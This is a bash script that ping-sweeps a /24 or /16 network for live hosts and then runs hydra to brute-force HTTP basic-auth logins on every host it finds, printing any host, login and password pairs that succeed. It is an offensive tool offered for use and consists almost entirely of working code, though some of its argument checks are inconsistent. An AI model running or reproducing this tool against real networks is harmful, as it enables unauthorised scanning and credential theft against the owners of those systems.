#!/bin/bash
trap " echo "" ; echo '[X] EXIT !' ; kill $( pgrep -e brute-R -e ping -e hydra 2> /dev/null ) ; cd .. ; rm -rf .workspace ; exit " SIGINT SIGTERM
if [[ -d .workspace ]] ; then rm -rf .workspace ; fi
mkdir .workspace
cd .workspace
echo ""
IP1=$( echo $1 | sed 's/\/16//g' | cut -d '.' -f1,2 )
IP2=$( echo $1 | sed 's/\/16//g' | cut -d '.' -f1,2,3 )
if [[ $2 == "--all" ]] ; then
if [[ $1 =~ "/24" ]] ; then for i in {1..254} ; do if [[ $( ping -c 1 -s 10 $IP2.$i ) =~ "ttl=" ]] ; then echo "$IP2.$i" >> ips.txt ; fi & done
elif [[ $1 =~ "/16" ]] ; then for v in $( seq 1 254 ) ; do echo $IP1.$v >> v.txt ; done ; for i in $( cat v.txt ) ; do
for j in $( seq 1 254 ) ; do if [[ $( ping -c 1 -s 10 $i.$j ) =~ "ttl=" ]] ; then echo "$i.$j" >> ips.txt ; fi & done ; done ; fi ; else
if [[ $1 =~ "/24" ]] ; then for i in $( seq 1 254 ) ; do if [[ $( ping -c 1 -s 10 $IP2.$i ) =~ "ttl=" ]] ; then echo "$IP2.$i" >> ips.txt ; fi & done
elif [[ $1 =~ "/16" ]] ; then for v in $( seq 1 $2 ) ; do echo $IP1.$v >> v.txt ; done ; for i in $( cat v.txt ) ; do
for j in $( seq 1 254 ) ; do if [[ $( ping -c 1 -s 10 $i.$j ) =~ "ttl=" ]] ; then echo "$i.$j" >> ips.txt ; fi &
done ; done ; fi ; fi
echo -e '\x1B[01;91m		|__ IPs list \x1B[0m\r'
x=1
for i in $(cat ips.txt ) ; do let x=$x+1 ; echo -e "\x1B[01;91m		|__ $i \x1B[0m" ; done
echo ""
echo -e '\x1B[01;91m		|__ Bruteforcing \x1B[0m\r'
if [[ $7 == "" ]] ; then
	if [[ $3 == "-l" ]] && [[ $5 == "-p" ]] ; then hydra -q -l $4 -p $6 -M ips.txt http-get / 1> found.txt 2> /dev/null
	elif [[ $4 == "-L" ]] && [[ $6 == "-P" ]] ; then hydra -q -L $5 -P $7 -M ips.txt http-get / 1> found.txt 2> /dev/null
	elif [[ $4 == "-l" ]] && [[ $6 == "-P" ]] ; then hydra -q -l $5 -P $7 -M ips.txt http-get / 1> found.txt 2> /dev/null
	elif [[ $4 == "-L" ]] && [[ $6 == "-p" ]] ; then hydra -q -L $5 -p $7 -M ips.txt http-get / 1> found.txt 2> /dev/null
	fi
fi &
sleep 20
kill `pgrep hydra`
cat found.txt | grep '[80]' | awk {' print "\t \t|__ "$2" "$3 "\t" $4" "$5 "\t" $6" "$7 '} | grep --color -e "host" -e "login" -e "password"
echo ""
